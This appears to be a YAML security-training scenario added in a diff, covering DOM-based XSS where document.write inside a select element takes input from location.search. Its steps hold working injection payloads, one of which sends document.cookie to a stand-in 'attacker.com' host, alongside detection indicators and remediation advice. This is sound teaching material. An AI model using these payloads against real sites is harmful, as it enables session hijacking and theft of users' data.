@@ -1,0 +1,91 @@
+# Category: Cross-Site Scripting (XSS)
+name: "DOM XSS in document.write sink using source location.search inside a select element"
+id: "xss-dom-document-write-select-001"
+category: "xss"
+subcategory: "dom_based"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This scenario covers DOM-based XSS where the application uses
+  `document.write` inside a `<select>` element, with data from
+  `location.search`. The attacker can inject a script that closes the
+  `<select>` and adds a script tag, bypassing any HTML encoding if the
+  context is inside a select's options.
+
+learning_objectives:
+  - Understand context-specific DOM XSS (inside select)
+  - Use `document.write` with unsanitized input
+  - Close the select element and inject a script tag
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of DOM and HTML
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify document.write inside a select element"
+    commands:
+      - "# Look for code like: document.write('<option>' + location.search.substring(6) + '</option>')"
+    expected_output: "Vulnerable code identified"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject payload that closes the select and inserts script"
+    commands:
+      - "# Payload: </select><script>alert('XSS')</script>"
+      - "# This closes the select and adds a script tag"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show unusual parameters"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data"
+    commands:
+      - "# Payload: </select><script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
+    expected_output: "Cookie exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "URLs with closing tags and script tags"
+  log_indicators:
+    - "Web server logs with suspicious query strings"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Avoid document.write with user input"
+    - "Use safe DOM methods like createElement and textContent"
+  long_term:
+    - "Implement CSP to prevent script injection"
+    - "Sanitize input for HTML context"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "Why is it dangerous to use document.write inside a select element?"
+  - "How can you close an HTML element via injection?"
+  - "What is the difference between using document.write and innerHTML?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+    title: "OWASP DOM XSS"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/write"
+    title: "MDN document.write"
